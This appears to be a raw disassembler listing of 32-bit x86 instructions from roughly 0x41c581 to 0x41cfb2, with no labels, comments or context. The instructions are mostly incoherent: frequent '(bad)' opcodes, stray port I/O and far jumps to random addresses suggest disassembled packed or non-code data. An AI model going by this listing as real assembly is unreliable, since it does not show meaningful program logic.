  41c581:	dec    ebp
  41c582:	inc    ebp
  41c583:	jl     0x41c58f
  41c585:	jge    0x41c5e5
  41c587:	mov    ah,0xaa
  41c589:	mov    esp,0x748178fb
  41c58e:	dec    esi
  41c58f:	sub    al,0xb4
  41c591:	push   esi
  41c592:	push   eax
  41c593:	pop    esi
  41c594:	cmp    DWORD PTR [eax],ebp
  41c596:	ds xor ch,0xe
  41c59a:	pop    esp
  41c59b:	inc    ebp
  41c59c:	sub    al,0x47
  41c59e:	repz loope 0x41c5a4
  41c5a1:	scas   al,BYTE PTR es:[edi]
  41c5a2:	fsubr  DWORD PTR [ebx+0x41]
  41c5a5:	mov    cl,0xfc
  41c5a7:	mov    ebp,ebp
  41c5a9:	add    ch,dl
  41c5ab:	mov    al,ds:0x8b47e98
  41c5b0:	in     al,0xd9
  41c5b2:	or     DWORD PTR [eax-0x28],ebx
  41c5b5:	(bad)  
  41c5b6:	fmul   DWORD PTR [ebp-0x45b7279c]
  41c5bc:	inc    edi
  41c5bd:	enter  0x5982,0x1a
  41c5c1:	rol    DWORD PTR [ecx+0x2dde5c06],0xb1
  41c5c8:	loope  0x41c569
  41c5ca:	inc    ebp
  41c5cb:	mov    esp,fs
  41c5cd:	enter  0x6671,0x9e
  41c5d1:	cdq    
  41c5d2:	out    0xf3,al
  41c5d4:	into   
  41c5d5:	out    0xeb,al
  41c5d7:	inc    ebp
  41c5d8:	pushf  
  41c5d9:	xchg   ebx,eax
  41c5da:	into   
  41c5db:	cs jecxz 0x41c628
  41c5de:	mov    WORD PTR [edx],?
  41c5e0:	scas   eax,DWORD PTR es:[edi]
  41c5e1:	test   edi,eax
  41c5e3:	add    ah,BYTE PTR [ecx+0x613abb50]
  41c5e9:	loope  0x41c59d
  41c5eb:	stc    
  41c5ec:	fild   DWORD PTR [eax]
	...
  41c656:	lds    esp,FWORD PTR [ebx]
  41c658:	xchg   ecx,eax
  41c659:	and    eax,0xe3f5b7f7
  41c65e:	inc    ebx
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0xf97e83f9
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	mov    esi,0x91ca67ee
  41c673:	mov    al,0xd
  41c675:	test   eax,0x64ed47b9
  41c67a:	mov    cl,ah
  41c67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c67d:	mov    cl,0x9d
  41c67f:	cli    
  41c680:	xchg   ebx,eax
  41c681:	mov    bh,0xac
  41c683:	repz adc eax,0x877c83a7
  41c689:	xchg   ebx,eax
  41c68a:	pop    esi
  41c68b:	fcmove st,st(5)
  41c68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c68e:	jo     0x41c611
  41c690:	mov    bh,0x10
  41c692:	je     0x41c62e
  41c694:	xor    esp,edi
  41c696:	push   0xad0214
  41c69b:	aas    
  41c69c:	xchg   cl,bh
  41c69e:	mov    es,WORD PTR [edi-0x38]
  41c6a1:	mov    ecx,0x67318e49
  41c6a6:	inc    edi
  41c6a7:	adc    DWORD PTR [ecx+0x7dfb0714],esp
  41c6ad:	leave  
  41c6ae:	push   ebx
  41c6af:	inc    eax
  41c6b0:	and    dh,BYTE PTR [edi-0x6c755bb6]
  41c6b6:	icebp  
  41c6b7:	call   0xdb6775fe
  41c6bc:	arpl   WORD PTR [edx],ax
  41c6be:	and    DWORD PTR [esi-0x201c89d3],0xffffff97
  41c6c5:	(bad)  
  41c6c6:	and    BYTE PTR [edi-0x43],0xbd
  41c6ca:	cmp    al,0xbf
  41c6cc:	jmp    0x5cfd19ff
  41c6d1:	nop
  41c6d2:	cmc    
  41c6d3:	mov    ah,0xda
  41c6d5:	or     DWORD PTR [ebp+0x2902429e],esp
  41c6db:	in     eax,0x9a
  41c6dd:	inc    esp
  41c6de:	test   DWORD PTR [eax+0x4e5e7cc9],ebp
  41c6e4:	push   eax
  41c6e5:	ds cmp ebp,ebx
  41c6e8:	sbb    eax,0x79c97064
  41c6ed:	mov    ah,0x68
  41c6ef:	ficomp DWORD PTR [esi]
  41c6f1:	frstor [ebx+eiz*1-0x4]
  41c6f5:	cld    
  41c6f6:	std    
  41c6f7:	and    al,0xdd
  41c6f9:	iret   
  41c6fa:	retf   0xa75
  41c6fd:	out    dx,al
  41c6fe:	push   esi
  41c6ff:	repz mov bl,0xb9
  41c702:	xchg   ecx,eax
  41c703:	push   es
  41c704:	sub    ebx,DWORD PTR [ecx]
  41c706:	es loopne 0x41c6ac
  41c709:	pop    es
  41c70a:	stos   DWORD PTR es:[edi],eax
  41c70b:	cmp    dh,BYTE PTR [edi+0x16deb7d8]
  41c711:	dec    esi
  41c712:	and    al,0xa3
  41c714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c715:	ins    DWORD PTR es:[edi],dx
  41c716:	push   eax
  41c717:	sub    BYTE PTR [ebp+0x2642f569],al
  41c71d:	fs push esp
  41c71f:	pop    ecx
  41c720:	cld    
  41c721:	push   ds
  41c722:	jns    0x41c6a8
  41c724:	call   0xd8e4:0x930f0e1
  41c72b:	push   ebx
  41c72c:	mov    ch,0x69
  41c72e:	std    
  41c72f:	inc    ebp
  41c730:	aam    0x3b
  41c732:	out    0x69,eax
  41c734:	cmp    dh,0xa7
  41c737:	fcom   QWORD PTR [esi-0x31]
  41c73a:	jmp    0x5cdd:0xfc679af4
  41c741:	mov    eax,0x6f90041f
  41c746:	dec    ebp
  41c747:	xor    esi,edx
  41c749:	inc    edx
  41c74a:	xchg   ecx,eax
  41c74b:	push   esi
  41c74c:	jns    0x41c7ba
  41c74e:	ins    BYTE PTR es:[edi],dx
  41c74f:	sbb    al,0x4d
  41c751:	jns    0x41c70a
  41c753:	inc    ebp
  41c754:	arpl   WORD PTR [ebx],ax
  41c756:	xor    ch,BYTE PTR [ebp+0x2bb7de87]
  41c75c:	in     eax,dx
  41c75d:	sub    ebp,DWORD PTR [ebp+0x32889f23]
  41c763:	inc    esp
  41c764:	or     al,0x3f
  41c766:	lea    esp,[esi+0x4b]
  41c769:	mov    eax,ds:0x66798d80
	...
  41c7d6:	fiadd  DWORD PTR [ecx]
  41c7d8:	ret    0xdb86
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	or     al,0xa2
  41c7e4:	popf   
  41c7e5:	js     0x41c84e
  41c7e7:	xor    al,BYTE PTR [ecx]
  41c7e9:	add    BYTE PTR [eax],al
  41c7eb:	add    DWORD PTR [eax],eax
  41c7ed:	add    BYTE PTR [esi+edx*2-0x44],bl
  41c7f1:	cmp    bh,BYTE PTR [eax]
  41c7f3:	or     al,BYTE PTR [edi+0x6]
  41c7f6:	in     al,dx
  41c7f7:	dec    ecx
  41c7f8:	pop    esp
  41c7f9:	xchg   ebp,eax
  41c7fa:	dec    esi
  41c7fb:	stos   DWORD PTR es:[edi],eax
  41c7fc:	aad    0xd9
  41c7fe:	and    eax,0x6d229acd
  41c803:	inc    eax
  41c804:	jne    0x41c7c1
  41c806:	in     al,0xd2
  41c808:	add    BYTE PTR [edx-0x2f8e1bbf],bh
  41c80e:	mov    WORD PTR [edi],fs
  41c810:	call   0xb9a0:0x7fcdd650
  41c817:	iret   
  41c818:	and    BYTE PTR [ecx+edi*1-0x75],0xf3
  41c81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c81e:	adc    edx,DWORD PTR [ecx-0x1ea39973]
  41c824:	pop    ds
  41c825:	mov    ebp,0x1fb87dcb
  41c82a:	cmp    BYTE PTR [esi+ebp*8-0x53106241],dl
  41c831:	jae    0x41c861
  41c833:	outs   dx,DWORD PTR ds:[esi]
  41c834:	pop    ecx
  41c835:	popa   
  41c836:	pop    esi
  41c837:	push   edi
  41c838:	sub    eax,0xcef97ce7
  41c83d:	gs mov dl,0xc1
  41c840:	cmc    
  41c841:	lea    esi,[esi+0x35919846]
  41c847:	dec    edx
  41c848:	repnz mov al,ds:0x18967451
  41c84e:	mov    eax,0x3ece0764
  41c853:	inc    eax
  41c854:	out    dx,eax
  41c855:	jnp    0x41c8ac
  41c857:	retf   0xcc96
  41c85a:	mov    ebx,0x393222d4
  41c85f:	mov    cl,0x15
  41c861:	and    al,0x52
  41c863:	jb     0x41c852
  41c865:	imul   edi,DWORD PTR ss:[ecx],0x707b1ca3
  41c86c:	(bad)  
  41c86e:	sti    
  41c86f:	pop    edx
  41c870:	jne    0x41c849
  41c872:	xor    esp,ebp
  41c874:	test   al,0xc3
  41c876:	pop    edx
  41c877:	pop    ebx
  41c878:	shl    BYTE PTR [esp+edx*4+0x7675480],1
  41c87f:	sub    bh,BYTE PTR [ebx]
  41c881:	push   0x589aabcf
  41c886:	xchg   DWORD PTR [edx-0x1d],esp
  41c889:	adc    al,0xbe
  41c88b:	dec    ebp
  41c88c:	mov    dl,0xbc
  41c88e:	mov    edx,0x649b6cd
  41c893:	jecxz  0x41c8fb
  41c895:	mov    ah,0xdb
  41c897:	jmp    0x41c90d
  41c899:	xchg   edx,eax
  41c89a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41c89c:	repnz mov BYTE PTR [edi+0x16],dh
  41c8a0:	push   ebx
  41c8a1:	jb     0x41c8bb
  41c8a3:	mov    al,ds:0xa542096c
  41c8a8:	imul   ebx,DWORD PTR [ebx],0x74
  41c8ab:	xchg   edx,eax
  41c8ac:	in     eax,dx
  41c8ad:	xchg   edi,eax
  41c8ae:	ja     0x41c90c
  41c8b0:	sbb    cl,BYTE PTR [esi-0x8]
  41c8b3:	jne    0x41c8fd
  41c8b5:	sbb    ah,BYTE PTR [edx]
  41c8b7:	aam    0xf5
  41c8b9:	mov    esi,0x4a659e73
  41c8be:	mov    bl,0x1d
  41c8c0:	(bad)  
  41c8c1:	mov    ah,0xd6
  41c8c3:	pop    ss
  41c8c4:	loope  0x41c8bd
  41c8c6:	add    esi,DWORD PTR [esi+0x12c5bdc9]
  41c8cc:	push   edx
  41c8cd:	mov    bh,0xf
  41c8cf:	je     0x41c907
  41c8d1:	jbe    0x41c8ec
  41c8d3:	dec    eax
  41c8d4:	pushf  
  41c8d5:	adc    BYTE PTR [ebx+0x6e],cl
  41c8d8:	lock and esp,DWORD PTR [esi]
  41c8db:	iret   
  41c8dc:	sub    bh,BYTE PTR [edi]
  41c8de:	sar    DWORD PTR [ebp-0x1b4459fc],1
  41c8e4:	sub    bh,cl
  41c8e6:	mov    esp,0x3af1aad3
  41c8eb:	into   
  41c8ec:	inc    edx
  41c8ed:	ins    BYTE PTR es:[edi],dx
	...
  41c956:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c95d:	ja     0x41c977
  41c95f:	sub    DWORD PTR [ebx],edi
  41c961:	add    edi,eax
  41c963:	lds    esp,FWORD PTR [ebp+edi*2+0x13367]
  41c96a:	add    BYTE PTR [ecx],al
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	aam    0x97
  41c970:	nop
  41c971:	das    
  41c972:	cmp    eax,0xbf69b354
  41c977:	xchg   ebx,eax
  41c978:	sbb    BYTE PTR [ecx-0x32],dh
  41c97b:	punpckhwd mm1,QWORD PTR [esp+ebp*8]
  41c97f:	fsubr  st(2),st
  41c981:	add    al,0xca
  41c983:	(bad)
  41c986:	push   esi
  41c987:	bswap  ecx
  41c989:	shr    BYTE PTR [ecx],0xa9
  41c98c:	push   ebx
  41c98d:	out    dx,al
  41c98e:	or     eax,0xdf486a3d
  41c993:	inc    eax
  41c994:	sbb    ch,BYTE PTR [ecx*2+0x76c3ca9e]
  41c99b:	xor    al,0x4a
  41c99d:	jge    0x41ca07
  41c99f:	in     al,0x9f
  41c9a1:	mov    ebp,0x2b4ab7ec
  41c9a6:	fiadd  WORD PTR [esp+eax*4+0x555474a5]
  41c9ad:	mov    ds:0x113dcdb0,al
  41c9b2:	sbb    eax,0x3512de5c
  41c9b7:	and    ebx,edi
  41c9b9:	jle    0x41c979
  41c9bb:	pop    edx
  41c9bc:	leave  
  41c9bd:	sub    al,0x4
  41c9bf:	ror    BYTE PTR [edi+0x3f],1
  41c9c2:	ja     0x41c9e7
  41c9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c5:	and    eax,0x21aadc1e
  41c9ca:	pushf  
  41c9cb:	call   0xaa17:0xf46b9de7
  41c9d2:	sub    DWORD PTR [edx+eiz*4],ebx
  41c9d5:	in     al,0x50
  41c9d7:	or     ebx,DWORD PTR [ecx-0x16]
  41c9da:	xor    eax,0x87fa394b
  41c9df:	dec    ebx
  41c9e0:	test   al,0x56
  41c9e2:	dec    ebp
  41c9e3:	iret   
  41c9e4:	sbb    edx,ebx
  41c9e6:	mov    esp,0x7b7e2b12
  41c9eb:	pop    ecx
  41c9ec:	repnz call 0xc537:0x33e4
  41c9f3:	daa    
  41c9f4:	bound  esp,QWORD PTR [edi+0x4a]
  41c9f7:	and    DWORD PTR [ecx-0x65],eax
  41c9fa:	fld    QWORD PTR [ecx+ebp*4]
  41c9fd:	in     al,0x97
  41c9ff:	pop    ebp
  41ca01:	cmp    eax,0xd4130a0
  41ca06:	sbb    al,BYTE PTR [eax]
  41ca08:	jmp    0x69a46023
  41ca0d:	and    ecx,DWORD PTR [edi-0x902c682]
  41ca13:	retf   
  41ca14:	sub    al,0x4a
  41ca16:	pop    esi
  41ca17:	sbb    ebp,DWORD PTR [ebx+ebp*8+0x74]
  41ca1b:	repnz mov DWORD PTR [esi-0x384513b1],ebp
  41ca22:	mov    WORD PTR [esp+ebx*1+0x373f4fff],es
  41ca29:	inc    eax
  41ca2a:	cmp    edx,edi
  41ca2c:	lods   eax,DWORD PTR ds:[esi]
  41ca2d:	iret   
  41ca2e:	arpl   WORD PTR [ebx+0x66],di
  41ca31:	sbb    bh,BYTE PTR [esi+0x49]
  41ca34:	push   edx
  41ca35:	test   DWORD PTR [edx+0x5f91dd07],eax
  41ca3b:	call   0xac2671c5
  41ca40:	(bad)  
  41ca41:	mov    eax,ds:0xf53c593a
  41ca46:	mov    esi,0x12811ca3
  41ca4b:	or     eax,0x546f4914
  41ca50:	clc    
  41ca51:	loop   0x41ca13
  41ca53:	shl    DWORD PTR [ebp+0x189c16df],1
  41ca59:	mov    ah,0xb2
  41ca5b:	add    bl,bh
  41ca5d:	add    ch,BYTE PTR [edx]
  41ca5f:	inc    esi
  41ca60:	(bad)  
  41ca62:	cmc    
  41ca63:	fldcw  WORD PTR [ebp-0x3df7d303]
  41ca69:	jno    0x41ca9f
  41ca6b:	cld    
  41ca6c:	(bad)  
  41ca6d:	test   BYTE PTR [eax],0x0
	...
  41cad4:	add    BYTE PTR [eax],al
  41cad6:	lock retf 0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	sahf   
  41cae3:	xor    al,0x8
  41cae5:	cdq    
  41cae6:	addr16 xor al,0x1
  41cae9:	add    BYTE PTR [eax],al
  41caeb:	add    DWORD PTR [eax],eax
  41caed:	add    BYTE PTR [edx-0x71],cl
  41caf0:	popa   
  41caf1:	or     BYTE PTR [ecx+0x6c],dh
  41caf4:	inc    edi
  41caf5:	sbb    eax,0xc683769f
  41cafa:	add    BYTE PTR [ebp-0x1d7e21cf],dh
  41cb00:	add    DWORD PTR [esi+0x851aae7],esi
  41cb06:	inc    eax
  41cb07:	pop    ss
  41cb08:	call   0xa4da:0xbd7133aa
  41cb0f:	bound  ecx,QWORD PTR [edi-0x11]
  41cb12:	dec    edx
  41cb13:	pushf  
  41cb14:	xchg   BYTE PTR [edi-0x58],ch
  41cb17:	inc    edi
  41cb18:	xchg   BYTE PTR [edx+0x6],cl
  41cb1b:	jno    0x41cad8
  41cb1d:	pop    es
  41cb1e:	inc    edx
  41cb1f:	sbb    eax,DWORD PTR [ebx]
  41cb21:	mov    ecx,0xe5c35caf
  41cb26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb27:	and    BYTE PTR [eax],bh
  41cb29:	mov    DWORD PTR [edi-0x15],ebp
  41cb2c:	out    0x95,al
  41cb2e:	ret    
  41cb2f:	mov    eax,0x7c156542
  41cb34:	mov    BYTE PTR [eax-0x1e],dl
  41cb37:	lods   al,BYTE PTR ds:[esi]
  41cb38:	(bad)  
  41cb39:	cmp    cl,BYTE PTR [ecx+0x61]
  41cb3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb3d:	sub    DWORD PTR [ebx-0x21],edx
  41cb40:	ja     0x41cadc
  41cb42:	ss mov eax,0x9c55db93
  41cb48:	pop    esp
  41cb49:	sub    dl,al
  41cb4b:	or     ax,0xf182
  41cb4f:	js     0x41cad2
  41cb51:	jno    0x41cae3
  41cb53:	inc    ebx
  41cb54:	outs   dx,BYTE PTR ds:[esi]
  41cb55:	jo     0x41cb9f
  41cb57:	sub    BYTE PTR [esi],0xb2
  41cb5a:	add    eax,0xb1d4c6cb
  41cb5f:	les    ebx,FWORD PTR [edx+0x73ddb885]
  41cb65:	icebp  
  41cb66:	aaa    
  41cb67:	xchg   esp,eax
  41cb68:	xchg   BYTE PTR [edi-0x7e],bh
  41cb6b:	iret   
  41cb6c:	add    al,BYTE PTR [ecx-0x3a7c781f]
  41cb72:	push   0x5a810885
  41cb77:	or     al,BYTE PTR [ecx+edi*8+0x3b]
  41cb7b:	mov    eax,ds:0xf90fbe62
  41cb80:	lds    esi,FWORD PTR [edx+0x2076b08c]
  41cb86:	mov    al,ds:0x75d0a815
  41cb8b:	icebp  
  41cb8c:	and    DWORD PTR [edi+0x51],0xf924716b
  41cb93:	add    edi,edx
  41cb95:	inc    ecx
  41cb96:	mov    edi,0x733b4cb9
  41cb9b:	mul    DWORD PTR [eiz*1-0x49320897]
  41cba2:	arpl   WORD PTR [esp+edi*4],cx
  41cba5:	xor    BYTE PTR [ebp-0x5a],0x63
  41cba9:	add    DWORD PTR [ebx+0x2e],edx
  41cbac:	cs cmp ch,ch
  41cbaf:	loopne 0x41cb96
  41cbb1:	das    
  41cbb2:	add    edx,DWORD PTR [esi+0x35]
  41cbb5:	outs   dx,BYTE PTR ds:[esi]
  41cbb6:	ja     0x41cb57
  41cbb8:	jb     0x41cb62
  41cbba:	push   ecx
  41cbbb:	lods   eax,DWORD PTR ds:[esi]
  41cbbc:	ret    
  41cbbd:	xchg   esi,eax
  41cbbe:	sub    eax,0xed78d855
  41cbc3:	inc    esi
  41cbc4:	adc    al,0xc
  41cbc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbc7:	enter  0xaf2,0x16
  41cbcb:	or     al,dh
  41cbcd:	jno    0x41cc1f
  41cbcf:	mov    al,ds:0xc70f688f
  41cbd4:	loop   0x41cbba
  41cbd6:	cmc    
  41cbd7:	push   ebx
  41cbd8:	mov    bl,0x24
  41cbda:	and    DWORD PTR [ecx-0x35],0x3f
  41cbde:	pop    ecx
  41cbdf:	mov    ah,0x8d
  41cbe1:	inc    BYTE PTR fs:[ecx-0x2f]
  41cbe5:	call   0xcc57:0x62e415bf
  41cbec:	sbb    dh,cl
	...
  41cc56:	sub    esi,edx
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x819ff822
  41cc65:	push   ds
  41cc66:	addr16 xor eax,0x1000001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	or     al,0xa0
  41cc70:	sub    al,BYTE PTR fs:[edx+0x5]
  41cc74:	mov    dl,BYTE PTR [ebx]
  41cc76:	mov    ah,0x41
  41cc78:	dec    ecx
  41cc79:	xor    eax,0x31a6c986
  41cc7e:	repz mov bl,0xc
  41cc81:	adc    esi,0x71
  41cc84:	out    dx,eax
  41cc85:	xlat   BYTE PTR ds:[ebx]
  41cc86:	add    eax,0xa5e31807
  41cc8b:	(bad)  
  41cc8d:	mov    ch,0xa0
  41cc8f:	dec    esi
  41cc90:	sub    BYTE PTR [esi+0x7a],0x2
  41cc94:	dec    BYTE PTR ss:[edx+0x6e]
  41cc98:	retf   
  41cc99:	daa    
  41cc9a:	popa   
  41cc9b:	ja     0x41cc43
  41cc9d:	push   edx
  41cc9e:	gs mov edx,0xb08a6e1d
  41cca4:	mov    bl,0xdb
  41cca6:	dec    edi
  41cca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cca8:	fnstenv [esi+0x3718695b]
  41ccae:	sub    eax,0x3a57c3c8
  41ccb3:	popf   
  41ccb4:	inc    edi
  41ccb5:	sbb    DWORD PTR [edx*2-0x70b91f8e],eax
  41ccbc:	test   al,0xc6
  41ccbf:	mov    ds:0x88c0a8b7,eax
  41ccc4:	push   ebx
  41ccc5:	mov    eax,0xca9554ec
  41ccca:	imul   ebp,DWORD PTR [edx],0xb584130c
  41ccd0:	dec    esp
  41ccd1:	or     eax,esp
  41ccd3:	(bad)
  41ccd6:	nop
  41ccd7:	jle    0x41cd1f
  41ccd9:	sti    
  41ccda:	cmp    edx,DWORD PTR [edi-0x36e62379]
  41cce0:	mov    dh,0xfc
  41cce2:	ds in  al,0xdb
  41cce5:	inc    esp
  41cce6:	sub    esi,edx
  41cce8:	jbe    0x41cd10
  41ccea:	or     ah,0x95
  41cced:	jno    0x41ccdb
  41ccef:	cmp    eax,0xc3e9908a
  41ccf4:	mov    cl,0x67
  41ccf6:	rep ins BYTE PTR es:[edi],dx
  41ccf8:	imul   ecx,DWORD PTR [edi-0x2806734d],0xa6f01d2d
  41cd02:	inc    edi
  41cd03:	xor    al,0x23
  41cd05:	push   0xa587a027
  41cd0a:	cmp    al,0x53
  41cd0c:	mov    eax,ds:0xcc1a9fff
  41cd11:	(bad)  
  41cd12:	fldenv [ebx-0x28]
  41cd15:	or     BYTE PTR [ecx],ch
  41cd17:	out    dx,eax
  41cd18:	jb     0x41cd69
  41cd1a:	pop    edx
  41cd1b:	or     BYTE PTR [esi+0x6b195a09],cl
  41cd21:	sub    eax,0x896932b9
  41cd26:	sbb    BYTE PTR [esi],ah
  41cd28:	inc    esi
  41cd29:	jl     0x41cd47
  41cd2b:	loop   0x41cd64
  41cd2d:	pushf  
  41cd2e:	mov    al,ds:0xe4adcaf
  41cd33:	(bad)
  41cd37:	sti    
  41cd38:	mov    ebx,0x66fad3f3
  41cd3d:	xchg   ebx,eax
  41cd3e:	sub    eax,0xab1bbcca
  41cd43:	add    BYTE PTR [edi+0x8b0d039],cl
  41cd49:	dec    esp
  41cd4a:	push   esp
  41cd4b:	ror    ch,cl
  41cd4d:	cmp    BYTE PTR [edi-0x1a],0xf4
  41cd51:	rcl    DWORD PTR cs:[edi-0x2fa00377],cl
  41cd58:	test   eax,0xf966b853
  41cd5d:	or     bl,bl
  41cd5f:	outs   dx,DWORD PTR ds:[esi]
  41cd60:	cld    
  41cd61:	js     0x41cdc0
  41cd63:	jo     0x41cdbc
  41cd65:	mov    ch,0x24
  41cd67:	fnstenv [eax]
  41cd69:	xor    al,0x6b
  41cd6b:	push   edx
  41cd6c:	fstp   TBYTE PTR [ebx+0x0]
	...
  41cdd6:	pusha  
  41cdd7:	cdq    
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	xchg   BYTE PTR [esi],dh
  41cde4:	mov    cl,0x77
  41cde6:	add    DWORD PTR ss:[bx+si],eax
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	aas    
  41cdef:	and    al,0xd9
  41cdf1:	fimul  WORD PTR [edx-0x28]
  41cdf4:	vcvtsi2sd xmm2,xmm2,DWORD PTR [ecx+0x6a]
  41cdfa:	(bad)  
  41cdfb:	dec    esi
  41cdfc:	pop    ss
  41cdfd:	scas   al,BYTE PTR es:[edi]
  41cdfe:	lds    esp,FWORD PTR [eax-0x19]
  41ce01:	out    dx,eax
  41ce02:	in     eax,0xcc
  41ce04:	popa   
  41ce05:	sub    al,0x3
  41ce07:	cwde   
  41ce08:	pop    edi
  41ce09:	push   ecx
  41ce0a:	(bad)  
  41ce0b:	out    dx,eax
  41ce0c:	sbb    edi,edx
  41ce0e:	nop
  41ce0f:	inc    ebx
  41ce10:	inc    eax
  41ce11:	jb     0x41ce4a
  41ce13:	jo     0x41cdfb
  41ce15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce16:	and    ebx,DWORD PTR [eax-0x27bfe760]
  41ce1c:	push   es
  41ce1d:	jne    0x41ce0f
  41ce1f:	test   eax,esi
  41ce21:	in     al,0x24
  41ce23:	mov    esi,0x5fa77f0b
  41ce28:	je     0x41cdde
  41ce2a:	test   DWORD PTR [edx+eax*1],esp
  41ce2d:	pushf  
  41ce2e:	daa    
  41ce2f:	xchg   ebp,eax
  41ce30:	xchg   esi,esp
  41ce32:	mov    gs,WORD PTR [ebp+0x7c]
  41ce35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce36:	jnp    0x41cde6
  41ce38:	cwde   
  41ce39:	adc    dl,BYTE PTR [eax+0x2871d6f0]
  41ce3f:	mov    edi,0x67b1285a
  41ce44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce45:	stos   BYTE PTR es:[edi],al
  41ce46:	xlat   BYTE PTR ds:[ebx]
  41ce47:	or     eax,0x458272b3
  41ce4c:	jne    0x41cebd
  41ce4e:	cld    
  41ce4f:	push   cs
  41ce50:	ret    0xa6f5
  41ce53:	loopne 0x41cebd
  41ce55:	not    ah
  41ce57:	mov    edi,ebx
  41ce59:	(bad)  
  41ce5a:	xchg   esp,eax
  41ce5b:	jmp    0xe8b3:0x26c812a6
  41ce62:	xor    al,0x3a
  41ce64:	mov    ecx,DWORD PTR [ebx+0x3e]
  41ce67:	aam    0xc6
  41ce69:	pop    ebp
  41ce6a:	jnp    0x41cea8
  41ce6c:	icebp  
  41ce6d:	es out 0x3d,eax
  41ce70:	(bad)  
  41ce71:	(bad)  
  41ce72:	dec    eax
  41ce73:	out    dx,eax
  41ce74:	pop    ebp
  41ce75:	dec    ecx
  41ce76:	fdivr  QWORD PTR [esi+0x57]
  41ce79:	in     eax,0x57
  41ce7b:	mov    eax,0x22dfcb62
  41ce80:	pop    es
  41ce81:	cmp    al,0x78
  41ce83:	inc    edi
  41ce84:	aas    
  41ce85:	xchg   esi,eax
  41ce86:	mov    ecx,0xe9358abd
  41ce8b:	lods   eax,DWORD PTR ds:[esi]
  41ce8c:	out    0xd8,al
  41ce8e:	jnp    0x41cea1
  41ce90:	(bad)  
  41ce91:	pop    ebx
  41ce92:	ret    
  41ce93:	xchg   edx,eax
  41ce94:	push   edi
  41ce95:	pop    esp
  41ce96:	jg     0x41ce55
  41ce98:	push   edx
  41ce99:	add    al,0x9b
  41ce9b:	inc    ebx
  41ce9c:	push   0xffffff83
  41ce9e:	lds    esp,FWORD PTR [edi-0x6d42e7fc]
  41cea4:	add    DWORD PTR [ebx+0x71],ebx
  41cea7:	pop    DWORD PTR [eax+ebx*8+0xbcbf355]
  41ceae:	les    ebp,FWORD PTR ds:0x8bc7aa30
  41ceb4:	shl    BYTE PTR [ecx+0x303816d8],1
  41ceba:	inc    esi
  41cebb:	mov    edx,0x43dda8cc
  41cec0:	or     dh,0x97
  41cec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cec4:	push   esp
  41cec5:	adc    BYTE PTR [edx],0x30
  41cec8:	xor    eax,0xc4f81f2a
  41cecd:	add    eax,0x3087db0f
  41ced2:	jo     0x41cf31
  41ced4:	out    0xbd,al
  41ced6:	rcl    BYTE PTR [edx+0x11],0x25
  41ceda:	cdq    
  41cedb:	mov    ecx,0xe670e255
  41cee0:	loope  0x41ce6d
  41cee2:	push   ds
  41cee3:	mov    esi,0x2bcd6f65
  41cee8:	out    0x6a,eax
  41ceea:	add    eax,0x2c375e
	...
  41cf53:	add    BYTE PTR [eax],al
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	pop    ds
  41cf63:	mov    bl,0x36
  41cf65:	test   eax,0x13767
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	push   eax
  41cf6f:	pop    ds
  41cf70:	mov    ds:0xeecdd9d4,al
  41cf75:	sub    DWORD PTR [ecx-0x69],esp
  41cf78:	xor    eax,0xd183f6ea
  41cf7d:	mov    eax,ds:0x331e6c0d
  41cf82:	je     0x41cf17
  41cf84:	mov    DWORD PTR [edx],ecx
  41cf86:	(bad)  
  41cf87:	mov    ebx,0x876083d8
  41cf8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf8d:	ret    
  41cf8e:	cld    
  41cf8f:	push   0x34
  41cf91:	sub    edi,DWORD PTR [eax+0x78]
  41cf94:	jo     0x41cfb3
  41cf96:	pop    ecx
  41cf97:	ins    DWORD PTR es:[edi],dx
  41cf98:	inc    esp
  41cf99:	ja     0x41cf95
  41cf9b:	les    ebx,FWORD PTR [edx-0x1f52ccd5]
  41cfa1:	imul   esi,DWORD PTR [ecx+eax*8-0x6467be5],0xfffffff2
  41cfa9:	mov    ebx,0xf0ace798
  41cfae:	enter  0x1993,0x1a
  41cfb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
